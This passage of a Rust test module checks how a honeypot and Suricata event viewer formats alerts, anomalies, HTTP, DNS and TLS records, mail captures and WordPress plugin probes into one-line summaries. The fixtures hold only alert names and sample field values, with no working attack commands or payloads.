            }),
        );
        assert_eq!(detail_for("tanner", &v), "POST /index.php  [cmd_exec]  result: uid=0(root)");
    }

    #[test]
    fn suricata_alert_includes_signature_category_severity_and_payload() {
        let v = json!({
            "event": {"sensor": "suricata"},
            "suricata": {"eve": {
                "event_type": "alert",
                "alert": {"signature": "ET SCAN Nmap Scripting Engine", "category": "Attempted Information Leak", "severity": 2},
                "payload_printable": "GET / HTTP/1.0"
            }}
        });
        assert_eq!(
            detail_for("suricata", &v),
            "ET SCAN Nmap Scripting Engine  [Attempted Information Leak]  [severity 2/major]  payload: GET / HTTP/1.0"
        );
    }

    #[test]
    fn suricata_alert_includes_mitre_suffix_when_present() {
        let v = json!({
            "event": {"sensor": "suricata"},
            "suricata": {"eve": {
                "event_type": "alert",
                "alert": {
                    "signature": "ET LATERAL_MOVEMENT SMB",
                    "severity": 1,
                    "metadata": {
                        "mitre_tactic_id": ["TA0008"], "mitre_tactic_name": ["Lateral_Movement"],
                        "mitre_technique_id": ["T1021"], "mitre_technique_name": ["Remote_Services"]
                    }
                }
            }}
        });
        assert_eq!(
            detail_for("suricata", &v),
            "ET LATERAL_MOVEMENT SMB  [severity 1/critical]  ATT&CK: TA0008 Lateral_Movement / T1021 Remote_Services"
        );
    }

    #[test]
    fn suricata_anomaly_shows_event_app_proto_and_layer() {
        let v = json!({
            "event": {"sensor": "suricata"},
            "suricata": {"eve": {"event_type": "anomaly", "anomaly": {"event": "REQUEST_HEADER_REPETITION", "app_proto": "http", "layer": "proto_parser"}}}
        });
        assert_eq!(detail_for("suricata", &v), "REQUEST_HEADER_REPETITION  [http]  (layer: proto_parser)");
    }

    #[test]
    fn suricata_http_dns_tls_render_new_detail_lines() {
        let http = json!({"event": {"sensor": "suricata"}, "suricata": {"eve": {"event_type": "http", "http": {"http_method": "GET", "url": "/x", "status": 200}}}});
        assert_eq!(detail_for("suricata", &http), "GET /x 200");

        let dns = json!({"event": {"sensor": "suricata"}, "suricata": {"eve": {"event_type": "dns", "dns": {"rrname": "example.com", "rrtype": "A"}}}});
        assert_eq!(detail_for("suricata", &dns), "query example.com (A)");

        let tls = json!({"event": {"sensor": "suricata"}, "suricata": {"eve": {"event_type": "tls", "tls": {"version": "TLS 1.3", "ja4": "t13d...", "sni": "evil.example"}}}});
        assert_eq!(detail_for("suricata", &tls), "TLS TLS 1.3 JA4 t13d... SNI evil.example");
    }

    #[test]
    fn mailoney_mail_body_shows_size_and_saved_path() {
        let v = src("mailoney", json!({"event": "mail-body", "size": 512, "body_path": "sess-1.eml"}));
        assert_eq!(detail_for("mailoney", &v), "DATA: 512 bytes  saved: sess-1.eml");
    }

    #[test]
    fn wordpot_plugin_probe() {
        let v = src("wordpot", json!({"plugin": "akismet", "path": "/wp-content/plugins/akismet/readme.txt"}));
        assert_eq!(detail_for("wordpot", &v), "plugin probe: akismet  /wp-content/plugins/akismet/readme.txt");
    }

    #[test]
    fn unknown_sensor_falls_back_to_honeypot_event_then_message() {
        let v = json!({"event": {"sensor": "some-new-sensor"}, "honeypot": {}, "message": "raw fallback line"});
        assert_eq!(detail_for("some-new-sensor", &v), "raw fallback line");
    }
}
